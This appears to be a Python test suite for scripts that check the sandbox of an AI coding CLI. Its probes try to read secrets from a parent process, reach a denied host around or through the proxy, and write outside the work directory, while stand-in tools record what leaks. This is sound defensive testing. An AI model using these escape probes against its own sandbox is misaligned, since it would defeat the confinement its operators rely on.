                "total_cost_usd": 0.1, "usage": {"input_tokens": 1, "output_tokens": 2}, "result": self.PROSE["result"],
                "a_new_field": self.PROSE["added"],
                "permission_denials": [{"tool_name": "Bash", "tool_input": {"command": self.PROSE["denied"]}}]}

    def stand_in(self, hides=("none", "none"), net="limited", runs=True, confined=True, flags=(), version=None,
                 after=None, status=None, is_error=False) -> pathlib.Path:
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        (folder / "version").write_text("%s (Claude Code)\n" % (version or self.PIN))
        if after is not None:
            (folder / "version.after").write_text("%s (Claude Code)\n" % after)
        (folder / "status").write_text(json.dumps({"loggedIn": True, "authMethod": "claude.ai"} if status is None else status))
        (folder / "stderr").write_text(self.PROSE["stderr"] + "\n")
        (folder / "answer").write_text(json.dumps(self.answer(is_error)))
        for scrub, hidden in zip("01", hides):
            (folder / ("hides-" + scrub)).write_text(hidden)
        (folder / "net").write_text(net)
        for flag in (("runs",) if runs else ()) + (("confined",) if confined else ()) + tuple(flags):
            (folder / flag).write_text("")
        (folder / "bin").mkdir()
        (folder / "host-bin").mkdir()
        for name, text in (("claude", self.STAND_IN), ("bin/curl", self.CURL), ("bin/ps", self.PS), ("host-bin/dig", self.DIG)):
            (folder / name).write_text(text)
            (folder / name).chmod(0o755)
        return folder

    def run_script(self, out, cfg, cli, home=None) -> subprocess.CompletedProcess:
        """The script as the Maintainer runs it, from a shell that holds a key the CLI must never see."""
        env = {"PATH": "%s:%s" % (pathlib.Path(cli).parent / "host-bin", os.environ["PATH"]), "HOME": str(home or self.home), "LANG": "C",
               "ANTHROPIC_API_KEY": "sk-" + "ant-" + "api03-NEVER-SEEN", "GH_TOKEN": "gh" + "p_NEVER-SEEN"}
        return subprocess.run(["bash", str(self.SCRIPT), str(out), str(cfg), str(cli)], cwd=SCRATCH.name,
                              capture_output=True, text=True, env=env, timeout=120, stdin=subprocess.DEVNULL)

    INSIDE = ("never-made-in-the-repo-p26",)

    def setUp(self):
        self.home = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        self.cfg = self.home.parent / (self.home.name + "-cfg")
        self.cfg.mkdir()
        self.out = self.home.parent / (self.home.name + "-out")

    def tearDown(self):
        for name in self.INSIDE:
            shutil.rmtree(ROOT / name, ignore_errors=True)

    def given(self, folder, call) -> dict:
        return dict(line.split("=", 1) for line in (folder / ("env-" + call)).read_text().splitlines() if "=" in line)

    def markers(self, folder) -> list:
        """The four markers the script made, read from what the stand-in CLI was given."""
        found = []
        for scrub in "01":
            given = self.given(folder, "task-" + scrub)
            found += [given["P26_PARENT_MARKER"], given["ANTHROPIC_CUSTOM_HEADERS"].split(": ", 1)[1]]
        return found

    def written(self, out) -> str:
        return "".join(p.read_text() for p in pathlib.Path(out).iterdir())

    def checked(self, out) -> dict:
        return json.loads((pathlib.Path(out) / "checked.json").read_text())

    def test_the_cli_is_given_only_the_named_environment_and_one_command(self):
        folder = self.stand_in(hides=("markers", "markers"))
        ran = self.run_script(self.out, self.cfg, folder / "claude")
        self.assertEqual(ran.returncode, 0, ran.stderr)
        named = {"HOME", "USER", "LOGNAME", "SHELL", "PATH", "TMPDIR", "LANG", "CLAUDE_CONFIG_DIR", "DISABLE_AUTOUPDATER"}
        task = {"CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", "P26_PARENT_MARKER", "ANTHROPIC_CUSTOM_HEADERS"}
        shell_adds = {"PWD", "OLDPWD", "SHLVL", "_"}
        for call, expected in (("version", named), ("auth", named), ("task-0", named | task), ("task-1", named | task)):
            self.assertEqual(set(self.given(folder, call)) - shell_adds, expected, call)
            self.assertNotIn("NEVER-SEEN", (folder / ("env-" + call)).read_text(), call)
        self.assertEqual([self.given(folder, "task-" + s)["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"] for s in "01"], ["0", "1"])
        self.assertEqual(len(set(self.markers(folder))), 4, "each Task has fresh markers")
        for scrub in "01":
            args = (folder / ("args-" + scrub)).read_text().split("\n")
            self.assertEqual(args[args.index("--tools") + 1], "Bash", "the model is given the shell alone")
            self.assertEqual(args[args.index("--allowedTools") + 1], "Bash(sh ./probe.sh)")
            self.assertEqual(args[args.index("--permission-prompts") + 1], "none")
            settings = json.loads(args[args.index("--settings") + 1])
            sandbox = settings["sandbox"]
            self.assertEqual((sandbox["enabled"], sandbox["failIfUnavailable"], sandbox["allowUnsandboxedCommands"],
                              sandbox["autoAllowBashIfSandboxed"], sandbox["network"]["allowedDomains"]),
                             (True, True, False, False, ["example.com"]), "a sandboxed command is not allowed for that alone")
            self.assertEqual(settings["permissions"], {"allow": ["Bash(sh ./probe.sh)"]})
            # The probe holds its values in its text: the script's pid, which is the CLI's parent, and the two hosts.
            probe = (folder / ("probe-" + scrub)).read_text()
            self.assertNotRegex(probe, r"@[A-Z]+@")
            self.assertEqual(re.search(r"^above=(\S+)$", probe, re.M).group(1), (folder / "cli-ppid").read_text().strip())
            self.assertEqual(re.findall(r"^(allowed|denied)=(\S+)$", probe, re.M), [("allowed", "example.com"), ("denied", "example.org")])
            self.assertNotIn("P26_", probe.replace("P26_PARENT", ""), "the probe reads nothing it needs from its environment")

    def test_no_marker_and_no_model_text_reaches_out(self):
        # The sandbox hides nothing and lets the tool write outside its directory, and the model writes words of its
        # own among the probe's codes: no marker and none of those words reaches OUT.
        folder = self.stand_in(net="open", confined=False, flags=("forge",))
        ran = self.run_script(self.out, self.cfg, folder / "claude")
        self.assertEqual(ran.returncode, 1, ran.stderr)
        written = self.written(self.out) + ran.stdout + ran.stderr
        for word in self.markers(folder) + list(self.PROSE.values()) + ["NEVER-SEEN", "the_model_wrote", "123"]:
            self.assertNotIn(word, written)
        for part in self.checked(self.out)["configurations"]:
            self.assertEqual((part["env"]["seen"], part["ancestors"]["seen"]),
                             ({"parent": True, "listed": True}, {"parent": True, "listed": True}))
            self.assertEqual(part["write_outside_the_work_directory"], {"exit": 0, "landed": True})
            self.assertEqual(part["stderr"], {"lines": 1, "characters": len(self.PROSE["stderr"]) + 1})
            self.assertEqual(sorted(part["fetches"]), ["allowed_around_proxy", "allowed_through_proxy",
                                                       "denied_around_proxy", "denied_by_address", "denied_through_proxy"])
            self.assertEqual((part["ancestors"]["read_exits"], part["ancestors"]["processes"]), (None, None))
        self.assertEqual(list(self.home.glob(".p26-write-probe-*")), [], "the write outside is removed")
        requests = json.loads((self.out / "requests.json").read_text())
        self.assertEqual([r["configuration"] for r in requests[2:]], ["plain", "scrubbed"])
        self.assertEqual(requests[0]["env"].keys() & {"P26_PARENT_MARKER", "ANTHROPIC_CUSTOM_HEADERS"}, set())
        self.assertNotIn(str(self.home), json.dumps(requests), "the probe is recorded as its template")

    def test_each_configuration_is_judged_by_the_condition(self):
        cases = [
                ("the scrub and the sandbox hide and limit", dict(hides=("none", "markers")), 0,
                 (False, False, True), (True, True, True)),
                ("the scrub hides the listed name alone", dict(hides=("none", "listed")), 1,
                 (False, False, True), (False, True, True)),
                ("the sandbox hides everything", dict(hides=("everything", "everything")), 0, (True, True, True), (True, True, True)),
                ("nothing limits a fetch", dict(hides=("markers", "markers"), net="open"), 1, (True, True, False), (True, True, False)),
                ("the denied host answers around the proxy", dict(hides=("markers", "markers"), net="around"), 1,
                 (True, True, False), (True, True, False)),
                ("the denied host answers through the proxy", dict(hides=("markers", "markers"), net="proxied"), 1,
                 (True, True, False), (True, True, False)),
                ("the denied host answers at its address", dict(hides=("markers", "markers"), net="address"), 1,
                 (True, True, False), (True, True, False)),
                ("the allowed host does not answer", dict(hides=("markers", "markers"), net="none"), 1,
                 (True, True, False), (True, True, False)),
                ("the model did not run the probe", dict(hides=("markers", "markers"), runs=False), 1,
                 (False, False, False), (False, False, False)),
                ("the probe recorded no environment", dict(hides=("markers", "markers"), flags=("empty-env",)), 1,
                 (False, False, True), (False, False, True)),
                ("the Task said it failed", dict(hides=("markers", "markers"), is_error=True), 1, (True, True, True), (True, True, True)),
                ("the version moved under the run", dict(hides=("markers", "markers"), after="9.9.9"), 1,
                 (True, True, True), (True, True, True))]
        # The tool's own environment is clean, but it reads the parent marker in a process above it; and a login that
        # fails leaves its record.
        runs = {name: kwargs for name, kwargs, *_ in cases}
        runs.update({"above": dict(hides=("markers", "markers"), flags=("above-leaks",)), "no login": dict(status={"loggedIn": False})})
        outs = self.run_each(runs)
        for name, kwargs, code, plain, scrubbed in cases:
            out, ran = outs[name]
            self.assertEqual(ran.returncode, code, (name, ran.stderr))
            checked = self.checked(out)
            holds = [tuple(p["holds"][k] for k in ("environment_hidden", "listed_hidden", "connections_limited"))
                     for p in checked["configurations"]]
            self.assertEqual(holds, [plain, scrubbed], name)
            self.assertEqual(checked["some_configuration_hides_and_limits"], code == 0, name)
        out, ran = outs["above"]
        self.assertEqual(ran.returncode, 1, ran.stderr)
        for part in self.checked(out)["configurations"]:
            self.assertEqual((part["env"]["seen"]["parent"], part["ancestors"]["seen"]["parent"]), (False, True))
            self.assertEqual(part["holds"]["environment_hidden"], False)
        out, ran = outs["no login"]
        self.assertEqual(ran.returncode, 1, ran.stderr)
        self.assertEqual((self.checked(out)["login"], self.checked(out)["some_configuration_hides_and_limits"]),
                         ({"exit": 0, "status": "no"}, False))

    def run_each(self, runs: dict) -> dict:
        """The script once for each stand-in, four at a time, each with an OUT and a CONFIG_DIR of its own: {name: (OUT, run)}."""
        def one(name):
            folder = self.stand_in(**runs[name])
            out = self.home.parent / (self.home.name + "-" + name.replace(" ", "-"))
            cfg = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
            return name, (out, self.run_script(out, cfg, folder / "claude"))
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as pool:
            return dict(pool.map(one, runs))

    def test_the_probe_tries_the_denied_host_at_the_address_looked_up_outside(self):
        # The address the script looked up, outside the sandbox, is the one the probe gives curl, in each Task.
        folder = self.stand_in(hides=("markers", "markers"))
        self.assertEqual(self.run_script(self.out, self.cfg, folder / "claude").returncode, 0)
        self.assertEqual((folder / "resolved").read_text().split(), ["example.org:443:192.0.2.7"] * 2)

    def test_the_probe_reads_nothing_above_the_cli(self):
        # The process above the probe is the script itself, the CLI's parent: the probe stops there and never reads it,
        # though the sandbox hides every name in its environment.
        for hides in ("markers", "everything"):
            folder = self.stand_in(hides=(hides, hides), flags=("to-cli",))
            out = self.home.parent / (self.home.name + "-" + hides)
            ran = self.run_script(out, self.cfg, folder / "claude")
            self.assertEqual(ran.returncode, 0, (hides, ran.stderr))
            script = (folder / "cli-ppid").read_text().strip()
            read = (folder / "ps-read").read_text().split()
            self.assertEqual(len(read), 2, "one process read in each Task, the probe's own")
            self.assertNotIn(script, read, "the script that started the CLI is never read")
        # A probe that knows no stop reads its own process alone.
        probe = re.search(r"<<'PROBE'\n(.*?)\nPROBE\n", self.SCRIPT.read_text(), re.S).group(1)
        work = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (work / "probe.sh").write_text(probe.replace("@ABOVE@", "").replace("@OUTSIDE@", str(work / "x")).replace("/proc/", "/nonexistent-p26/proc/")
                                       .replace("@ALLOWED@", "example.com").replace("@DENIED@", "example.org")
                                       .replace("@ADDRESS@", "192.0.2.7"))
        folder = self.stand_in(flags=("to-cli",))
        (folder / "cli-ppid").write_text("2\n")
        subprocess.run(["sh", "./probe.sh"], cwd=work, env={"PATH": "%s:/usr/bin:/bin" % (folder / "bin")},
                       timeout=60, capture_output=True, stdin=subprocess.DEVNULL)
        self.assertEqual(len((folder / "ps-read").read_text().split()), 1)

    def test_each_refusal_stops_before_anything_is_asked(self):
        folder = self.stand_in()
        existing = self.home.parent / (self.home.name + "-taken")
        existing.mkdir()
        dot_claude = self.home / ".claude" / "deep"
        dot_claude.mkdir(parents=True)
        for name, out, cfg, said in [("OUT exists", existing, self.cfg, "exists; name a new directory"),
                                     ("OUT inside the repo", ROOT / self.INSIDE[0], self.cfg, "OUT is inside the repo"),
                                     ("OUT inside CONFIG_DIR", self.cfg / "out", self.cfg, "OUT is inside CONFIG_DIR"),
                                     ("CONFIG_DIR inside the repo", self.out, ROOT / "tools", "CONFIG_DIR is inside the repo"),
                                     ("CONFIG_DIR is HOME", self.out, self.home, "the home directory or holds it"),
                                     ("CONFIG_DIR under ~/.claude", self.out, dot_claude, "under ~/.claude"),
                                     ("CONFIG_DIR missing", self.out, self.home / "none", "CONFIG_DIR is not a directory")]:
            ran = self.run_script(out, cfg, folder / "claude")
            self.assertEqual(ran.returncode, 2, (name, ran.stderr))
            self.assertIn(said, ran.stderr, name)
            self.assertFalse(out.exists() and out != existing, name)
            self.assertFalse((folder / "env-version").exists(), name + ": nothing was asked")
        folder = self.stand_in(flags=("no-address",))
        ran = self.run_script(self.out, self.cfg, folder / "claude")
        self.assertEqual(ran.returncode, 2, ran.stderr)
        self.assertIn("example.org has no IPv4 address here", ran.stderr)
        self.assertFalse((folder / "env-version").exists(), "no address: nothing was asked")
        for name, folder, said in [("wrong version", self.stand_in(version="0.0.1"), "is version '0.0.1', exit 0, not " + self.PIN),
                                   ("not logged in", self.stand_in(status={"loggedIn": False}), "login under CONFIG_DIR is 'no'")]:
            out = self.home.parent / (self.home.name + "-" + name.replace(" ", "-"))
            ran = self.run_script(out, self.cfg, folder / "claude")
            self.assertEqual(ran.returncode, 1, (name, ran.stderr))
            self.assertIn(said, ran.stderr, name)
            self.assertFalse((folder / "args-0").exists(), name + ": no Task was asked")

    def test_the_shell_snapshots_the_run_made_are_deleted(self):
        older = self.cfg / "shell-snapshots" / "older.sh"
        older.parent.mkdir()
        older.write_text("kept")
        os.utime(older, (1, 1))
        folder = self.stand_in(hides=("markers", "markers"))
        (folder / "claude").write_text(self.STAND_IN.replace(
            'scrub=$CLAUDE_CODE_SUBPROCESS_ENV_SCRUB\n', 'scrub=$CLAUDE_CODE_SUBPROCESS_ENV_SCRUB\n      echo snap > "$CLAUDE_CONFIG_DIR/shell-snapshots/new-$scrub.sh"\n'))
        self.assertEqual(self.run_script(self.out, self.cfg, folder / "claude").returncode, 0)
        self.assertEqual([p.name for p in older.parent.iterdir()], ["older.sh"])
        self.assertEqual([p["shell_snapshots_removed"] for p in self.checked(self.out)["configurations"]], [1, 1])


class SandboxWritesTrial(unittest.TestCase):
    """`tools/trial_p51_sandbox_writes.sh` (issue 312), run against a stand-in CLI that asks P-50's real stub over HTTP, as
    the pinned CLI would, and runs the probe with the writes the test says the sandbox holds sent nowhere: the verdict
    each configuration and order earns, what each configuration is given, and that nothing it wrote outside is left."""

    SCRIPT = ROOT / "tools" / "trial_p51_sandbox_writes.sh"
    STUB = ROOT / "tools" / "trial_p50_stub.py"
    PIN = re.search(r"^PIN=(\S+)$", SCRIPT.read_text(), re.M).group(1)
    # The stand-in CLI. A Task asks the stub for the tool call, streamed, runs the probe it names with each write the
    # file `lands-SCRUB` does not name sent to a path that cannot exist, as a sandbox that holds it would, and sends the
    # result back: SCRUB is the scrub's value, or `unset`. TARGETS are numbered as the script names them.
    CLI = r'''#!/usr/bin/env python3
import json, os, pathlib, re, shlex, subprocess, sys, urllib.request
here = pathlib.Path(__file__).resolve().parent
args = sys.argv[1:]
if args[:1] == ["--version"]:
    name = "version.after" if (here / "asked").exists() and (here / "version.after").exists() else "version"
    print((here / name).read_text().strip() + " (Claude Code)")
    sys.exit(0)
(here / "asked").write_text("")
scrub = os.environ.get("CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", "unset")
base = os.environ["ANTHROPIC_BASE_URL"]
def post(body):
    request = urllib.request.Request(base + "/v1/messages", data=json.dumps(body).encode(), headers={"content-type": "application/json"})
    with urllib.request.urlopen(request, timeout=20) as answer:
        return answer.read().decode()
tools = [{"name": "Bash", "input_schema": {}}]
said = post({"model": "m", "max_tokens": 8, "stream": True, "tools": tools, "messages": [{"role": "user", "content": "the task"}]})
events = [json.loads(line[6:]) for line in said.splitlines() if line.startswith("data: ")]
start = next(e for e in events if e["type"] == "content_block_start")["content_block"]
failed = (here / "tool-error").exists()
if not failed and not (here / "no-tool").exists():
    probe = open("probe.sh").read()
    line = re.search(r"(?m)^for target in (.*); do$", probe).group(1)
    targets = shlex.split(line)
    with open(here / "targets", "a") as said:
        said.write("".join(t + "\n" for t in targets))
    lands = (here / ("lands-" + scrub)).read_text().split() if (here / ("lands-" + scrub)).exists() else []
    kept = [t if str(i) in lands else "/nonexistent-p51/x" for i, t in enumerate(targets)]
    open("probe.run", "w").write(probe.replace(line, " ".join(shlex.quote(t) for t in kept)))
    subprocess.run(["sh", "./probe.run"], timeout=30, check=False)
post({"model": "m", "max_tokens": 8, "stream": True, "tools": tools,
      "messages": [{"role": "user", "content": [{"type": "tool_result", "tool_use_id": start["id"], "content": "ran", "is_error": failed}]}]})
print(json.dumps({"type": "result", "subtype": "success", "is_error": (here / "is-error").exists(), "num_turns": 2, "result": "done"}))
'''

    def stand_in(self, lands=None, flags=(), after=None) -> pathlib.Path:
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        (folder / "version").write_text(self.PIN + "\n")
        if after:
            (folder / "version.after").write_text(after + "\n")
        for scrub, which in (lands or {}).items():
            (folder / ("lands-" + scrub)).write_text(" ".join(str(i) for i in which))
        for flag in flags:
            (folder / flag).write_text("")
        # The CLI is a shell script that keeps the environment it was given, then hands on to the Python.
        (folder / "claude").write_text('#!/bin/sh\nhere=$(cd "$(dirname "$0")" && pwd)\n'
                                       '[ "$1" = --version ] || env > "$here/env-${CLAUDE_CODE_SUBPROCESS_ENV_SCRUB-unset}"\n'
                                       'exec python3 "$here/cli.py" "$@"\n')
        (folder / "cli.py").write_text(self.CLI)
        (folder / "claude").chmod(0o755)
        return folder

    def run_script(self, folder, order="forward") -> tuple:
        home = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        out = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "out"
        env = {"PATH": os.environ["PATH"], "HOME": str(home), "LANG": "C", "TMPDIR": str(pathlib.Path(SCRATCH.name).resolve())}
        ran = subprocess.run(["bash", str(self.SCRIPT), str(out), order, str(folder / "claude"), str(self.STUB)],
                             cwd=SCRATCH.name, capture_output=True, text=True, env=env, timeout=120, stdin=subprocess.DEVNULL)
        return home, out, ran

    def test_each_configuration_and_order_is_judged_by_the_condition(self):
        names = ["home", "dotfile", "tmp", "parent"]
        cases = [
            ("every write is held", dict(), "forward", True, {}),
            ("every write is held, the other way round", dict(), "reversed", True, {}),
            ("the scrub lets the home directory's write land", dict(lands={"1": [0]}), "forward", False, {"scrubbed": ["home"]}),
            ("the scrub unset lets /tmp's and the parent's land", dict(lands={"unset": [2, 3]}), "reversed", False,
             {"unset": ["tmp", "parent"]}),
            ("each setting lets the dotfile land", dict(lands={"unset": [1], "0": [1], "1": [1]}), "forward", False,
             {"unset": ["dotfile"], "plain": ["dotfile"], "scrubbed": ["dotfile"]}),
            ("the tool's result is an error", dict(flags=("tool-error",)), "forward", False, {}),
            ("the probe never ran", dict(flags=("no-tool",)), "forward", False, {}),
            ("the version moved under the run", dict(after="9.9.9"), "forward", False, {}),
            ("the Task said it failed", dict(flags=("is-error",)), "forward", False, {}),
        ]
        def one(case):
            name, kwargs, order, passes, landed = case
            folder = self.stand_in(**kwargs)
            return case, (folder,) + self.run_script(folder, order)
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as pool:
            results = list(pool.map(one, cases))
        for (name, kwargs, order, passes, landed), (folder, home, out, ran) in results:
            self.assertEqual(ran.returncode, 0, (name, ran.stderr))
            checked = json.loads((out / ("checked-%s.json" % order)).read_text())
            want = ["unset", "plain", "scrubbed"] if order == "forward" else ["scrubbed", "plain", "unset"]
            self.assertEqual([p["configuration"] for p in checked["configurations"]], want, name)
            self.assertEqual(checked["every_configuration_passes"], passes, name)
            flags = kwargs.get("flags", ())
            ran_probe = not set(flags) & {"tool-error", "no-tool"}
            for part in checked["configurations"]:
                where = (name, part["configuration"])
                self.assertEqual(part["holds"]["answered"], "is-error" not in flags, where)
                self.assertEqual(sorted(n for n in names if part["writes"][n]["landed"]), sorted(landed.get(part["configuration"], [])), where)
                self.assertEqual(part["probe_ran"], ran_probe, where)
                self.assertEqual(part["inside"]["landed"], ran_probe, where + ("the control",))
                self.assertEqual(part["holds"]["tool_ran"], "tool-error" not in flags, where)
                self.assertEqual(part["holds"]["every_write_held"], ran_probe and not landed.get(part["configuration"]), where)
            # Nothing the probe wrote outside is left: each target it was given, in the home directory, /tmp and the
            # work directory's parent, as the stand-in recorded them.
            given = (folder / "targets").read_text().split() if (folder / "targets").exists() else []
            self.assertEqual(len(given), 0 if set(flags) & {"tool-error", "no-tool"} else 12, name)
            self.assertEqual([t for t in given if os.path.lexists(t)], [], name)

    def test_each_configuration_is_given_its_scrub_alone_and_a_directory_of_its_own(self):
        folder = self.stand_in()
        home, out, ran = self.run_script(folder)
        self.assertEqual(ran.returncode, 0, ran.stderr)
        given = {}
        for scrub in ("unset", "0", "1"):
            given[scrub] = dict(line.split("=", 1) for line in (folder / ("env-" + scrub)).read_text().splitlines() if "=" in line)
        self.assertNotIn("CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", given["unset"])
        self.assertEqual((given["0"]["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"], given["1"]["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"]), ("0", "1"))
        self.assertEqual(len({g["CLAUDE_CONFIG_DIR"] for g in given.values()}), 3, "a configuration directory each")
        for g in given.values():
            self.assertEqual((g["ANTHROPIC_API_KEY"], g["GITHUB_ACTIONS"]), ("dummy-p51-not-a-key", "true"))
            self.assertRegex(g["ANTHROPIC_BASE_URL"], r"^http://127\.0\.0\.1:[0-9]{1,5}$")
        self.assertEqual(sorted(p.name for p in out.iterdir()), ["checked-forward.json"])

    def test_each_refusal_stops_before_anything_is_asked(self):
        folder = self.stand_in()
        taken = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        for name, args, said in [("an order it does not know", ("out", "sideways"), "ORDER is forward or reversed"),
                                 ("OUT exists", (str(taken), "forward"), "exists; name a new directory")]:
            ran = subprocess.run(["bash", str(self.SCRIPT), args[0], args[1], str(folder / "claude"), str(self.STUB)],
                                 cwd=pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)), capture_output=True, text=True,
                                 timeout=60, stdin=subprocess.DEVNULL)
            self.assertEqual(ran.returncode, 2, name)
            self.assertIn(said, ran.stderr, name)
            self.assertFalse((folder / "asked").exists(), name + ": nothing was asked")


class PauseReadTrial(unittest.TestCase):
    """`tools/trial_p52_pause.sh` (the #193 PR 2 ruling, read:pass.pause), run against a stand-in curl and openssl that
    act out GitHub's answers: one token minted for the controller's installation, three reads made with it, the token
    revoked last; the token never reaches a command line or OUT, and a read GitHub refuses is kept as it was answered."""

    SCRIPT = ROOT / "tools" / "trial_p52_pause.sh"
    TOKEN = "ghs_" + "P" * 36
    # The stand-in curl: what GitHub answers each call, from the files beside it; it records what it was asked, and
    # whether the token arrived on its standard input and not in its arguments.
    CURL = r'''#!/usr/bin/env python3
import json, pathlib, sys
here = pathlib.Path(__file__).resolve().parent
args = sys.argv[1:]
given = sys.stdin.read()
with open(here / "calls", "a") as calls:
    calls.write(json.dumps({"argv": args, "stdin_bearer": given.startswith("Authorization: Bearer ")}) + "\n")
url = next(a for a in args if a.startswith("https://"))
method = args[args.index("-X") + 1] if "-X" in args else "GET"
def status(name, default):
    found = here / ("status-" + name)
    return int(found.read_text()) if found.exists() else default
if method == "POST" and url.endswith("/access_tokens"):
    code = status("mint", 201)
    body = {"token": "''' + "ghs_" + "P" * 36 + r'''", "expires_at": "2026-10-22T19:00:00Z",
            "permissions": {"actions_variables": "read", "issues": "write", "metadata": "read"}, "repository_selection": "selected"}
    print(json.dumps(body) + "\n" + str(code), end="")
    sys.exit(0)
if method == "DELETE":
    print(status("revoke", 204), end="")
    sys.exit(0)
if "/organization-variables" in url:
    code, body = status("list", 200), {"total_count": 1, "variables": [{"name": "FACTORY_PAUSED", "value": "false"}]}
elif "/orgs/" in url:
    code, body = status("org", 403), {"message": "Resource not accessible by integration"}
else:
    code, body = status("repo", 200), {"name": "FACTORY_PAUSED", "value": "false"}
print("HTTP/2 %d\r\ncontent-type: application/json\r\n\r\n%s" % (code, json.dumps(body)))
'''
    OPENSSL = r'''#!/bin/sh
case "$1" in
  base64) /usr/bin/base64 | tr -d '\n' ;;
  dgst) cat > /dev/null; printf 'signature' ;;
esac
'''

    def stand_in(self, **statuses) -> pathlib.Path:
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        for name, text in (("curl", self.CURL), ("openssl", self.OPENSSL)):
            (folder / name).write_text(text)
            (folder / name).chmod(0o755)
        for name, code in statuses.items():
            (folder / ("status-" + name)).write_text(str(code))
        (folder / "key.pem").write_text("not a key: the stand-in openssl never reads it\n")
        return folder

    def run_script(self, folder, out=None) -> tuple:
        out = out or pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "out"
        env = {"PATH": "%s:/usr/bin:/bin" % folder, "HOME": str(folder), "LANG": "C",
               "TMPDIR": str(pathlib.Path(SCRATCH.name).resolve())}
        ran = subprocess.run(["sh", str(self.SCRIPT), str(out), str(folder / "key.pem")], capture_output=True, text=True,
                             env=env, timeout=60, stdin=subprocess.DEVNULL)
        return out, ran

    def calls(self, folder) -> list:
        return [json.loads(line) for line in (folder / "calls").read_text().splitlines()]

    def test_one_token_reads_three_times_and_is_revoked_and_never_kept(self):
        folder = self.stand_in()
        out, ran = self.run_script(folder)
        self.assertEqual(ran.returncode, 0, ran.stderr)
        calls = self.calls(folder)
        said = [(c["argv"][c["argv"].index("-X") + 1] if "-X" in c["argv"] else "GET",
                 next(a for a in c["argv"] if a.startswith("https://")).split("api.github.com/", 1)[1]) for c in calls]
        repo = json.loads((ROOT / "config" / "apps.json").read_text())["apps"]["controller"]["installed_on"][1]
        self.assertEqual(said, [("POST", "app/installations/172571513/access_tokens"),
                                ("GET", "repos/%s/actions/variables/FACTORY_PAUSED" % repo),
                                ("GET", "orgs/combsmith/actions/variables/FACTORY_PAUSED"),
                                ("GET", "repos/%s/actions/organization-variables?per_page=100" % repo),
                                ("DELETE", "installation/token")])
        # The token, and the JWT, reach curl on its standard input alone; nothing narrows the token.
        self.assertTrue(all(c["stdin_bearer"] for c in calls))
        self.assertTrue(all(self.TOKEN not in " ".join(c["argv"]) for c in calls))
        self.assertNotIn("-d", calls[0]["argv"])
        written = "".join(p.read_text() for p in out.iterdir()) + ran.stdout + ran.stderr
        self.assertNotIn(self.TOKEN, written)
        self.assertEqual(sorted(p.name for p in out.iterdir()),
                         ["clean-1", "clean-2", "clean-3", "ran_at", "redacted-1", "redacted-2", "redacted-3",
                          "requests.json", "token.json"])
        self.assertEqual(json.loads((out / "token.json").read_text()),
                         {"permissions": {"actions_variables": "read", "issues": "write", "metadata": "read"}, "repository_selection": "selected"})
        # A refused read is kept as it was answered, and its status recorded.
        asked = json.loads((out / "requests.json").read_text())
        self.assertEqual(([r["status"] for r in asked["reads"]], asked["revoked"]), (["200", "403", "200"], "204"))
        self.assertIn("Resource not accessible by integration", (out / "clean-2").read_text())

    def test_a_mint_refused_reads_nothing(self):
        folder = self.stand_in(mint=403)
        out, ran = self.run_script(folder)
        self.assertEqual(ran.returncode, 1)
        self.assertIn("no token was minted", ran.stderr)
        self.assertEqual(len(self.calls(folder)), 1)
        self.assertFalse((out / "token.json").exists())

    def test_a_revocation_refused_stops_it_and_says_so(self):
        folder = self.stand_in(revoke=500)
        out, ran = self.run_script(folder)
        self.assertEqual(ran.returncode, 1)
        self.assertIn("revoking the token returned 500", ran.stderr)
        self.assertIn("revoke it by hand", ran.stderr)
        self.assertFalse((out / "requests.json").exists())

    def test_each_refusal_stops_before_anything_is_asked(self):
        folder = self.stand_in()
        taken = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        for name, out, said in [("OUT exists", taken, "exists; name a new directory"),
                                ("OUT inside the repo", ROOT / "never-made-p52", "is inside the repo")]:
            out_, ran = self.run_script(folder, out)
            self.assertEqual(ran.returncode, 2, name)
            self.assertIn(said, ran.stderr, name)
            self.assertFalse((folder / "calls").exists(), name + ": nothing was asked")
        self.assertFalse((ROOT / "never-made-p52").exists())


class Redaction(unittest.TestCase):
    """`tools/redact_trial.py` runs on the raw capture, outside the repo, before anyone reads it."""

    def redact(self, raw: str) -> tuple:
        out, said = io.StringIO(), io.StringIO()
        self.assertEqual(redact_trial.main([], stdin=io.BytesIO(raw.encode()), stdout=out, stderr=said), 0)
        return out.getvalue(), said.getvalue()

    def test_it_opens_no_path_it_is_given(self):
        # SonarCloud S2083 and S8707: the capture comes on standard input and goes out on standard output, so a path is
        # never taken from the arguments. Any argument is refused before anything is read.
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (folder / "raw").write_text("HTTP/2.0 200 OK\n\n{}\n")
        for argv in ([str(folder / "raw"), str(folder / "out")], [str(folder / "raw")], ["-"]):
            said, read = io.StringIO(), io.BytesIO(b"{}")
            self.assertEqual(redact_trial.main(argv, stdin=read, stdout=io.StringIO(), stderr=said), 2, argv)
            self.assertEqual(read.tell(), 0, argv)
            self.assertIn("opens no path", said.getvalue())
        self.assertFalse((folder / "out").exists())
        # As the scripts run it: in through a pipe, out through a pipe, and what it took out named on standard error.
        ran = subprocess.run([sys.executable, "-m", "tools.redact_trial"], cwd=ROOT, capture_output=True, text=True,
                             input="HTTP/2.0 200 OK\nAuthorization: x\nContent-Type: text/plain\n\nfine\n", timeout=60)
        self.assertEqual((ran.returncode, ran.stdout), (0, "HTTP/2.0 200 OK\nContent-Type: text/plain\n\nfine\n"))
